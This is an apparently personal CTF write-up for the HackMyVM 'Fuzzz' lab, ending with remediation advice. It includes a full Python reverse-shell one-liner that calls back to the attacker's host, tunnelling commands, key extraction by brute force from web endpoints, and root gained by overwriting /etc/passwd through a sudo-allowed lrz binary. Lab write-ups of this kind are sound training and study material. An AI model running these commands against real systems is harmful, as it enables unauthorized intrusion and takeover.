+++
date = '2026-08-25T17:56:00+03:00'
draft = false
title = 'Fuzzz — HackMyVM'
tags = ["HackMyVM", "Linux", "Android Debug Bridge", "Port Forwarding", "SSH", "Character Extraction", "lrz", "Privilege Escalation", "CTF Writeup"]
feature = 'feature.png'
showTableOfContents = true
+++

## Overview

Fuzzz is a HackMyVM challenge that revolves around an Android Debug Bridge service masquerading on port 5555. The attack chain started with an ADB connection to obtain an initial shell, escalated through port forwarding to discover a hidden web application running internally, and required a character-by-character extraction technique to recover an SSH key embedded in base64-encoded responses. After lateral movement to the `asahi` user, I abused the `lrz` file transfer utility (run via sudo with no password) to overwrite `/etc/passwd` and gain root access.

## Step 1: Reconnaissance and Enumeration

The assessment began with a full port scan against the target (192.168.56.110) to identify running services.

```
nmap -sV -sC -p- 192.168.56.110
```

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 b6:7b:e7:e5:b3:33:c7:ff:db:63:5d:b3:75:0d:e2:dd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMn+ANUyHwmNWHCBCNEevXEDdony9CC/L/mswWy2QPfo6dGeYVo2nr5m31TOVyka83Rip8dkEifkNqU6gWkXezQ=
|   256 0a:ce:e5:c3:de:50:9c:6d:b7:0d:de:73:b8:6c:28:55 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKWBvhip783XnDTvLFztqGGwoe7JnTYbc6dvpjTarJg
5555/tcp open  adb     syn-ack ttl 64 Android Debug Bridge (token auth required)
```

**Key Findings:**

- SSH (22) is running OpenSSH 9.9.
- Port 5555 hosts an Android Debug Bridge (ADB) service with token authentication required.

## Step 2: Initial Access

I connected to the target's ADB service and obtained an interactive shell.

```
adb connect 192.168.56.110 5555
```

```
adb shell
```

![](adb-shell.png)

The ADB shell was limited, so I spawned a Python reverse shell using `nohup` to maintain persistence.

```
nohup python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<my-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' &
```

![](nohup-reverse-shell.png)

I caught the incoming shell with Penelope.

![](penelope-shell.png)

## Step 3: Internal Enumeration

Checking for sudo permissions prompted for the `runner` user's password, which I did not have.

```
/ $ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for runner: 
```

I enumerated listening ports on localhost and discovered port 80 was open internally.

```
netstat -tlnup
```

![](netstat-port80.png)

Inspecting the process revealed a uWSGI application running under the `asahi` user.

```
ps aux | grep 80
```

![](ps-aux-uwsgi.png)

The `runner` user had no read access to the web application directory.

```
ls -la /opt/webapp/
```

![](opt-webapp.png)

**Key Findings:**

- Internal web service running on `127.0.0.1:80`
- uWSGI application serving a Python Flask/Django app
- The ADB service was actually a Python fake service, not genuine `adbd`

## Step 4: Web Application Discovery

I needed to forward port 80 to my machine. My first attempt used Penelope's port forwarding, but the connection kept dropping.

![](chisel-portfwd.png)

I switched to Chisel for a more stable tunnel.

```
./chisel client 192.168.56.1:80 R:socks
```

```
chisel server -p 80 --reverse --socks5
```

![](chisel-portfwd.png)

I ran **Feroxbuster** through the SOCKS proxy but only found `/health` and `/version`, which provided no actionable information.

```
curl 127.0.0.1/health
OK
curl 127.0.0.1/version
1.9.1
```

![](feroxbuster-results.png)

Switching to **ffuf** with a larger wordlist uncovered a `/line` endpoint with incremental page numbers.

```
ffuf -x socks5://127.0.0.1:1080 -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -t 40
```

![](ffuf-results.png)

The scan revealed pages `line1` through `line5`, plus `line01` and `line02`, all returning `200` with zero-length bodies.

```
                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
line                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
line2                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 47ms]
line1                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
line3                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
line4                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
line01                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
line02                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
```

However, directly accessing these pages returned 404, which I did not understand at first.

![](line-pages-404.png)

## Step 5: Character-by-Character Extraction

Since both Penelope and Chisel had issues exposing the pages reliably, I set up an SSH reverse tunnel as a last resort.

```
ssh -R 8080:127.0.0.1:80 kaotik@192.168.56.1
```

After setting it up, I confirmed the tunnel was working by successfully fetching `/line5`.

![](ssh-tunnel-success.png)

Lines 1 through 5 returned `200` while line 6 returned `404`. I noticed that appending characters to the URL also returned `200`, suggesting the application was leaking data one character at a time.

```
curl -I http://127.0.0.1:8080/line1/b
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0
```

I wrote a script to automate brute-forcing each character across the full ASCII range, extracting the hidden content from each `/line` endpoint.

```
cat extraction.sh
```

![](extraction-results.png)

The extracted values were base64-encoded strings. Decoding the first fragment confirmed it was part of an OpenSSH private key.

```
echo 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW' | base64 -d
openssh-key-v1nonenone3
                       ssh-ebase64: invalid input
```

The final fragment revealed the key belonged to the `asahi` user.

```
echo '5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=' | base64 -d
```

![](base64-lastline.png)

## Step 6: Lateral Movement

I referenced a sample SSH key to understand the proper format.

![](sshkey-reference.png)

After reassembling all the extracted base64 fragments, I added the standard OpenSSH private key headers.

```
-----BEGIN OPENSSH PRIVATE KEY-----
```

```
-----END OPENSSH PRIVATE KEY-----
```

![](sshkey-formatting.png)

Using the reconstructed key, I authenticated successfully as `asahi`.

![](ssh-asahi-auth.png)

## Step 7: Privilege Escalation

I checked sudo permissions for `asahi` and found the binary `/usr/local/bin/lrz` could be run without a password.

```
sudo -l
```

![](sudo-l-asahi.png)

I inspected the binary and discovered it was a file transfer utility supporting ZMODEM/YMODEM/XMODEM protocols.

```
sudo /usr/local/bin/lrz -h
```

![](lrz-help.png)

The `--append` flag combined with `--tcp-server` mode allowed me to append arbitrary data to files over a TCP connection. I abused this to overwrite `/etc/passwd` with a custom entry containing a root-privileged user.

First, I generated a password hash for the new user.

```
openssl passwd -1 -salt hello '<REDACTED>'
```

![](openssl-passwd.png)

I navigated to `/etc` and started the lrz server in append mode.

```
cd /etc
sudo /usr/local/bin/lrz --append --tcp-server
```

From my machine, I connected and transferred a crafted `passwd` file containing the new root user.

```
sz --tcp-client 192.168.56.110:43090
```

![](lrz-transfer.png)

I switched to the newly created user and confirmed root access.

```
/etc # id
uid=0(root) gid=0(root) groups=0(root)
```

![](root-access.png)

## Conclusion

This lab demonstrated a full compromise of a Linux machine through a chain of creative misconfigurations and tool abuse:

1. A fake ADB service on port 5555 provided an initial interactive shell.
2. Port forwarding revealed a hidden web application running internally on port 80.
3. Character-by-character extraction from the web endpoints recovered base64-encoded SSH key fragments.
4. Reassembling the fragments yielded a valid SSH private key for the `asahi` user.
5. The `lrz` binary, runnable via sudo without a password, was abused to overwrite `/etc/passwd` and gain root.

To secure the environment, the following remediations are recommended:

- **Remove fake ADB services** and ensure only legitimate debugging interfaces are exposed.
- **Restrict internal web applications** to localhost only and enforce authentication.
- **Avoid embedding secrets in web responses**, even as encoded or obfuscated data.
- **Audit sudo permissions** and remove unnecessary binary executions, especially file transfer utilities with append capabilities.
- **Monitor `/etc/passwd` modifications** and use file integrity monitoring to detect unauthorized changes.
